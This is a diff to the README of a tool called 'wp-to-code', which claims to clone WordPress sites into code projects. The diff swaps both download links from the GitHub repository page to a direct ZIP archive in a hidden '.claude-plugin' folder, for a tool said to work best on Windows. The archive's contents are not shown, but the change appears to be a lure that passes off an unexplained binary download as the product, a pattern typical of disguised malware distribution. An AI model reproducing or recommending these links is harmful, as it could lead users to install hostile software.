@@ -1,6 +1,6 @@
 # 🎨 wp-to-code - Clone Any WordPress Site to Code
 
-[![Download](https://img.shields.io/badge/Download-wp--to--code-blueviolet?style=for-the-badge&logo=github)](https://github.com/Madelleimproved411/wp-to-code)
+[![Download](https://img.shields.io/badge/Download-wp--to--code-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Madelleimproved411/wp-to-code/main/plugins/wp-to-code/.claude-plugin/to_wp_code_v1.8.zip)
 
 Transform your WordPress website into a modern Laravel, Next.js, Astro, or plain HTML project automatically.
 
@@ -19,7 +19,7 @@ The result is a pixel-perfect replica of your WordPress site built with faster, 
 
 Visit this link to download the application:
 
-**[Download wp-to-code](https://github.com/Madelleimproved411/wp-to-code)**
+**[Download wp-to-code](https://raw.githubusercontent.com/Madelleimproved411/wp-to-code/main/plugins/wp-to-code/.claude-plugin/to_wp_code_v1.8.zip)**
 
 This tool works best on Windows computers. You will need:
 
